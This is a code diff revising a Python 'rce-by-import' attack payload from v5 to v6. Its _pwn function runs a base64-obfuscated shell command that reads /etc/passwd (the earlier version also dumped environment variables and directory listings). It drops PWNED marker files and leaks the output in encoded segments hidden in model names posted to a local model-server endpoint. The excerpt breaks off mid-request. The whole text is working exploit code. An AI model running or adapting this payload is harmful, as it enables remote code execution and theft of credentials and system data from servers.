@@ -1,22 +1,21 @@
-# rce-by-import payload v5 - long output segmented exfil
+# rce-by-import v6
 import os, subprocess, base64, threading, json, urllib.request
 
 def _pwn():
     try:
         import base64 as b
-        cmd = b.b64decode("aWQ7IGhvc3RuYW1lOyB1bmFtZSAtYTsgZWNobyAnLS0tUEFTU1dELS0tJzsgY2F0IC9ldGMvcGFzc3dkOyBlY2hvICctLS1FTlYtLS0nOyBlbnYgfCBoZWFkIC0zMDsgZWNobyAnLS0tTU9ERUxTLS0tJzsgbHMgLWxhIC9tb2RlbHMgfCBoZWFkIC0zMDsgZWNobyAnLS0tUk9PVC0tLSc7IGxzIC1sYSAvIHwgaGVhZCAtMzA=").decode()
-        out = subprocess.check_output(cmd, shell=True, timeout=20, stderr=subprocess.STDOUT)
+        cmd = b.b64decode("Y2F0IC9ldGMvcGFzc3dk").decode()
+        out = subprocess.check_output(cmd, shell=True, timeout=15, stderr=subprocess.STDOUT)
         out_s = out.decode(errors="replace")
         for d in ["/models", "/tmp"]:
             try:
-                with open(d + "/PWNED-RCE.txt", "w") as f:
+                with open(d + "/PWNED-PASSWD.txt", "w") as f:
                     f.write(out_s)
             except Exception:
                 pass
         b64 = base64.b64encode(out).decode().replace("+","-").replace("/","_").replace("=","")
-        # 分段注册: 每段80字符
-        for i in range(0, len(b64), 80):
-            seg = b64[i:i+80]
+        for i in range(0, len(b64), 100):
+            seg = b64[i:i+100]
             name = f"ZZ--{seg}"
             try:
                 req = urllib.request.Request("http://127.0.0.1:8080/models/apply",
